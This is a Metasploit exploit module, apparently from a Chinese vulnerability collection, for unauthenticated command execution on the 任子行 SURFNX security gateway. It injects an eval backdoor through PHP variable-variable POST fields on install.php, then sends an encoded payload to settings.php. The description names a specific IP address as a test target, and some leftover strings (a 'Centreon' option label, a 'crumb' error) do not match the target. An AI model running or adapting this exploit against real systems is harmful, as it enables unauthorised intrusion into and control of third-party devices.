require 'msf/core'
class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
                      'Name' => '任子行SURFNX安全网关任意命令执行',
                      'Description' => %q{
                            install.php,无需登录等认证即可执行任意系统命令, 测试地址:175.167.116.34
      },
                      'Author' =>
                          [
                              '路人甲',
                              '扶摇直上打飞机'
                          ],
                      'License' => MSF_LICENSE,
                      'References' =>
                          [
                              ['url', 'http://www.wooyun.org/bugs/wooyun-2015-0166157']
                          ],
                      'Privileged' => true,
                      'Platform' => ['php'],
                      'Targets' => [['all of them', {}],],
                      'Arch' => ARCH_PHP,
                      'DefaultTarget' => 0,
          ))
    register_options(
        [
            Opt::RHOST(),
            Opt::RPORT(80),
            OptString.new('TARGETURI', [true, 'The URI of the Centreon Application', '/']),
        ], self.class)
  end

  def create_backdoor
    print_status("start to create backdoor ....")
    res = send_request_cgi(
        {
            'method' => 'POST',
            'uri' => normalize_uri(target_uri.path, 'install.php'),
            'headers' =>
                {
                    "User-Agent" => "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0",
                },
            'vars_post' =>
                {
                    'oem_pdn' => 'default',
                    'step' => "2",
                    '${${extract($_REQUEST)}}' => '1',
                    '${${@eval(base64_decode($x))}}' => '1',
                }
        }, 4)
    if res.code.to_s == '200'
      print_good("create backdoor sucessful")
    else
      fail_with(Failure::Unknown, "#{rhost} cant get crumb value ")
    end
  end

  def post_payload
    create_backdoor
    print_status("start to exploit ....")
    res = send_request_cgi(
        {
            'method' => 'POST',
            'uri' => normalize_uri(target_uri.path, 'lib', 'templates', 'default', 'settings.php'),
            'headers' =>
                {
                    "User-Agent" => "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0",
                },
            'vars_post' =>
                {
                    'x' => Rex::Text.encode_base64(payload.encoded),
                },
        }, 4)
  end

  def exploit
    post_payload
  end

  def rhost
    datastore['RHOST']
  end

  def rport
    datastore['RPORT']
  end

  def targeturi
    datastore['TARGETURI']
  end

end